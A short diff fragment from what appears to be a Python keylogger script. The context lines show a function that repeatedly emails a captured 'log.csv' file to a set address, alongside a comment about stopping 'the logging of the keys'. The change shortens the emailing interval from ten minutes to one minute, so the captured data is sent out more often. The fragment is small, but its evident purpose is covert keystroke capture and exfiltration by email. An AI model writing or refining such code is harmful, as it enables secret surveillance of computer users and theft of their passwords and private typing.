@@ -133,7 +133,7 @@ while True:
 # function to send the csv file via email
     def send_csv():
         send_email('log.csv', 'log.csv', toaddr)
-        Timer(600.0, send_csv).start()
+        Timer(60.0, send_csv).start()
         
 # function to stop the logging of the keys
     def on_release(key):
